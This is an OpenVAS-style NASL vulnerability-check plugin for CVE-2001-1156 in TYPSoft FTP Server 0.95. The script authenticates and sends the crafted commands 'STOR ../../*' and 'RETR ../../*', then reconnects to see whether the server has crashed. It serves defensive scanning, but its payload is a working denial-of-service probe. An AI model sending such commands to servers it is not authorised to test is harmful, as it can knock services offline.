# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11097");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3409");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-1156");
  script_name("TypSoft FTP STOR/RETR DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/typsoft/detected");

  script_tag(name:"solution", value:"Upgrade your software or use another FTP service.");

  script_tag(name:"summary", value:"The remote FTP server crashes when it is sent the command

  RETR ../../*

  or

  STOR ../../*");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash.");

  script_tag(name:"affected", value:"TYPSoft FTP Server v0.95 is known to be affected.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

cmd[0] = "STOR";
cmd[1] = "RETR";

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if( ! banner || "TYPSoft FTP Server" >!< banner )
  exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

if (!ftp_authenticate(socket:soc, user:login, pass:pass)) exit(0);

#if(!r)exit(0);
for (i=0; i<2;i++){
  send(socket:soc, data:string(cmd[i], " ../../*\r\n"));
  r = recv_line(socket:soc, length:20000);
}

ftp_close(socket: soc);

soc = open_sock_tcp(port);
if (!soc) security_message(port);
if (soc) ftp_close(socket: soc);
